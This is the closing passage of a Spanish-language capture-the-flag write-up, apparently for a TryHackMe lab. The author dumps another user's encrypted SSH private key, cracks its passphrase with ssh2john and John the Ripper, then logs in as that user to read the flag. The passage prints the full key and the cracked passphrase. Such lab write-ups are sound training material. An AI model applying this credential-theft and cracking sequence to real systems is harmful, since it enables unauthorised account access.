</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> kay  kay    <span style="color:#ae81ff">57</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> pass.bak
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kay  kay   <span style="color:#ae81ff">655</span> Apr <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> .profile
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kay  kay  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .ssh
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kay  kay     <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> .sudo_as_admin_successful
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> root kay   <span style="color:#ae81ff">538</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .viminfo
</span></span><span style="display:flex;"><span>jan@basic2:/home/kay$ cat pass.bak 
</span></span><span style="display:flex;"><span>cat: pass.bak: Permission denied
</span></span><span style="display:flex;"><span>jan@basic2:/home/kay$ 
</span></span></code></pre></div><p>Tenemos un fichero llamado <strong>pass.bak</strong> que tiene pinta de ser la bandera de la sala para la última pregunta. Desgraciadamente no puedo acceeder a su contenido. Sin embargo veo hay una carpeta oculta llamada <strong>.ssh</strong>, seguramente contendra la clave de autenticación ssh encriptada. Vamos a echarle un ojo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jan@basic2:/home/kay$ ls .ssh/
</span></span><span style="display:flex;"><span>authorized_keys  id_rsa  id_rsa.pub
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jan@basic2:/home/kay$ cat .ssh/id_rsa
</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
</span></span><span style="display:flex;"><span>Proc-Type: 4,ENCRYPTED
</span></span><span style="display:flex;"><span>DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
</span></span><span style="display:flex;"><span>o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
</span></span><span style="display:flex;"><span>XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX
</span></span><span style="display:flex;"><span>AkAN+3T5FU49AEVKBJtZnLTEBw31mxjv0lLXAqIaX5QfeXMacIQOUWCHATlpVXmN
</span></span><span style="display:flex;"><span>lG4BaG7cVXs1AmPieflx7uN4RuB9NZS4Zp0lplbCb4UEawX0Tt+VKd6kzh+Bk0aU
</span></span><span style="display:flex;"><span>hWQJCdnb/U+dRasu3oxqyklKU2dPseU7rlvPAqa6y+ogK/woTbnTrkRngKqLQxMl
</span></span><span style="display:flex;"><span>lIWZye4yrLETfc275hzVVYh6FkLgtOfaly0bMqGIrM+eWVoXOrZPBlv8iyNTDdDE
</span></span><span style="display:flex;"><span>3jRjqbOGlPs01hAWKIRxUPaEr18lcZ+OlY00Vw2oNL2xKUgtQpV2jwH04yGdXbfJ
</span></span><span style="display:flex;"><span>LYWlXxnJJpVMhKC6a75pe4ZVxfmMt0QcK4oKO1aRGMqLFNwaPxJYV6HauUoVExN7
</span></span><span style="display:flex;"><span>bUpo+eLYVs5mo5tbpWDhi0NRfnGP1t6bn7Tvb77ACayGzHdLpIAqZmv/0hwRTnrb
</span></span><span style="display:flex;"><span>RVhY1CUf7xGNmbmzYHzNEwMppE2i8mFSaVFCJEC3cDgn5TvQUXfh6CJJRVrhdxVy
</span></span><span style="display:flex;"><span>VqVjsot+CzF7mbWm5nFsTPPlOnndC6JmrUEUjeIbLzBcW6bX5s+b95eFeceWMmVe
</span></span><span style="display:flex;"><span>B0WhqnPtDtVtg3sFdjxp0hgGXqK4bAMBnM4chFcK7RpvCRjsKyWYVEDJMYvc87Z0
</span></span><span style="display:flex;"><span>ysvOpVn9WnFOUdON+U4pYP6PmNU4Zd2QekNIWYEXZIZMyypuGCFdA0SARf6/kKwG
</span></span><span style="display:flex;"><span>oHOACCK3ihAQKKbO+SflgXBaHXb6k0ocMQAWIOxYJunPKN8bzzlQLJs1JrZXibhl
</span></span><span style="display:flex;"><span>VaPeV7X25NaUyu5u4bgtFhb/f8aBKbel4XlWR+4HxbotpJx6RVByEPZ/kViOq3S1
</span></span><span style="display:flex;"><span>GpwHSRZon320xA4hOPkcG66JDyHlS6B328uViI6Da6frYiOnA4TEjJTPO5RpcSEK
</span></span><span style="display:flex;"><span>QKIg65gICbpcWj1U4I9mEHZeHc0r2lyufZbnfYUr0qCVo8+mS8X75seeoNz8auQL
</span></span><span style="display:flex;"><span>4DI4IXITq5saCHP4y/ntmz1A3Q0FNjZXAqdFK/hTAdhMQ5diGXnNw3tbmD8wGveG
</span></span><span style="display:flex;"><span>VfNSaExXeZA39jOgm3VboN6cAXpz124Kj0bEwzxCBzWKi0CPHFLYuMoDeLqP/NIk
</span></span><span style="display:flex;"><span>oSXloJc8aZemIl5RAH5gDCLT4k67wei9j/JQ6zLUT0vSmLono1IiFdsMO4nUnyJ3
</span></span><span style="display:flex;"><span>z+3XTDtZoUl5NiY4JjCPLhTNNjAlqnpcOaqad7gV3RD/asml2L2kB0UT8PrTtt+S
</span></span><span style="display:flex;"><span>baXKPFH0dHmownGmDatJP+eMrc6S896+HAXvcvPxlKNtI7+jsNTwuPBCNtSFvo19
</span></span><span style="display:flex;"><span>l9+xxd55YTVo1Y8RMwjopzx7h8oRt7U+Y9N/BVtbt+XzmYLnu+3qOq4W2qOynM2P
</span></span><span style="display:flex;"><span>nZjVPpeh+8DBoucB5bfXsiSkNxNYsCED4lspxUE4uMS3yXBpZ/44SyY8KEzrAzaI
</span></span><span style="display:flex;"><span>fn2nnjwQ1U2FaJwNtMN5OIshONDEABf9Ilaq46LSGpMRahNNXwzozh+/LGFQmGjI
</span></span><span style="display:flex;"><span>I/zN/2KspUeW/5mqWwvFiK8QU38m7M+mli5ZX76snfJE9suva3ehHP2AeN5hWDMw
</span></span><span style="display:flex;"><span>X+CuDSIXPo10RDX+OmmoExMQn5xc3LVtZ1RKNqono7fA21CzuCmXI2j/LtmYwZEL
</span></span><span style="display:flex;"><span>OScgwNTLqpB6SfLDj5cFA5cdZLaXL1t7XDRzWggSnCt+6CxszEndyUOlri9EZ8XX
</span></span><span style="display:flex;"><span>oHhZ45rgACPHcdWcrKCBfOQS01hJq9nSJe2W403lJmsx/U3YLauUaVgrHkFoejnx
</span></span><span style="display:flex;"><span>CNpUtuhHcVQssR9cUi5it5toZ+iiDfLoyb+f82Y0wN5Tb6PTd/onVDtskIlfE731
</span></span><span style="display:flex;"><span>DwOy3Zfl0l1FL6ag0iVwTrPBl1GGQoXf4wMbwv9bDF0Zp/6uatViV1dHeqPD8Otj
</span></span><span style="display:flex;"><span>Vxfx9bkDezp2Ql2yohUeKBDu+7dYU9k5Ng0SQAk7JJeokD7/m5i8cFwq/g5VQa8r
</span></span><span style="display:flex;"><span>sGsOxQ5Mr3mKf1n/w6PnBWXYh7n2lL36ZNFacO1V6szMaa8/489apbbjpxhutQNu
</span></span><span style="display:flex;"><span>Eu/lP8xQlxmmpvPsDACMtqA1IpoVl9m+a+sTRE2EyT8hZIRMiuaaoTZIV4CHuY6Q
</span></span><span style="display:flex;"><span>3QP52kfZzjBt3ciN2AmYv205ENIJvrsacPi3PZRNlJsbGxmxOkVXdvPC5mR/pnIv
</span></span><span style="display:flex;"><span>wrrVsgJQJoTpFRShHjQ3qSoJ/r/8/D1VCVtD4UsFZ+j1y9kXKLaT/oK491zK8nwG
</span></span><span style="display:flex;"><span>URUvqvBhDS7cq8C5rFGJUYD79guGh3He5Y7bl+mdXKNZLMlzOnauC5bKV4i+Yuj7
</span></span><span style="display:flex;"><span>AGIExXRIJXlwF4G0bsl5vbydM55XlnBRyof62ucYS9ecrAr4NGMggcXfYYncxMyK
</span></span><span style="display:flex;"><span>AXDKwSwwwf/yHEwX8ggTESv5Ad+BxdeMoiAk8c1Yy1tzwdaMZSnOSyHXuVlB4Jn5
</span></span><span style="display:flex;"><span>phQL3R8OrZETsuXxfDVKrPeaOKEE1vhEVZQXVSOHGCuiDYkCA6al6WYdI9i2+uNR
</span></span><span style="display:flex;"><span>ogjvVVBVVZIBH+w5YJhYtrInQ7DMqAyX1YB2pmC+leRgF3yrP9a2kLAaDk9dBQcV
</span></span><span style="display:flex;"><span>ev6cTcfzhBhyVqml1WqwDUZtROTwfl80jo8QDlq+HE0bvCB/o2FxQKYEtgfH4/UC
</span></span><span style="display:flex;"><span>D5qrsHAK15DnhH4IXrIkPlA799CXrhWi7mF5Ji41F3O7iAEjwKh6Q/YjgPvgj8LG
</span></span><span style="display:flex;"><span>OsCP/iugxt7u+91J7qov/RBTrO7GeyX5Lc/SW1j6T6sjKEga8m9fS10h4TErePkT
</span></span><span style="display:flex;"><span>t/CCVLBkM22Ewao8glguHN5VtaNH0mTLnpjfNLVJCDHl0hKzi3zZmdrxhql+/WJQ
</span></span><span style="display:flex;"><span>4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
</span></span><span style="display:flex;"><span>e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
</span></span><span style="display:flex;"><span>3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><p>Pues ya tenemos la clave privada de kay para acceder al servidor por ssh. Me la copio en mi equipo y me preparo para romperla. Aunque antes hay que convertirla en un formato compatible para la herramienta <strong>john the ripper</strong>. La guardo en un fichero llamado <strong>rsa_original</strong> y la paso por la herramienta <strong>ssh2john</strong> y hago que me la guarde en un fichero llamado <strong>crack.txt</strong>. Despues la paso por <strong>john the ripper</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ssh2john rsa_original &gt; crack.txt   
</span></span><span style="display:flex;"><span>                                                                                                                             
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ john --wordlist<span style="color:#f92672">=</span>rockyou.txt crack.txt   
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
</span></span></code></pre></div><p>Tras unos minutos, obtenemos la contraseña: <strong>beeswax</strong></p>
<p>Esta nos servirá para conectarnos por ssh con el usuario de kay, pero tenemos que usar la clave pública para que nos permita realizar la conexión, así que aprovechamos el equipo en el que nos hemos colado que tiene los dos pares de claves para hacer la conexión desde aqui:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@10.10.59.211
</span></span><span style="display:flex;"><span>Could not create directory <span style="color:#e6db74">&#39;/home/jan/.ssh&#39;</span>.
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.59.211 (10.10.59.211)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Enter passphrase for key &#39;</span>id_rsa<span style="color:#960050;background-color:#1e0010">&#39;</span>: 
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packages can be updated.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates are security updates.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Mon Apr <span style="color:#ae81ff">23</span> 16:04:07 <span style="color:#ae81ff">2018</span> from 192.168.56.102
</span></span><span style="display:flex;"><span>kay@basic2:~$ cat pass.bak
</span></span><span style="display:flex;"><span>heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</span></span></code></pre></div><p>Y tras conectarme por ssh con el usuario de kay, puedo mostrar el contenido del fichero <strong>pass.bak</strong> y obtener la bandera final de la sala <strong>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</strong></p>
<hr>
<p>¡Nos vemos!</p>
<p>(◕‿‿◕) ~ Hack the planet!</p>
</div>
</article>

    
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                class="buttonTag"
                
                href="/tags/ctf">#CTF</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/easy">#easy</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/hacking">#hacking</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/thm">#THM</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/tryhackme">#tryhackme</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/writeup">#writeup</a>
        
    </p>






                    </main><footer>
    <hr />


<p><small>
        2022 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
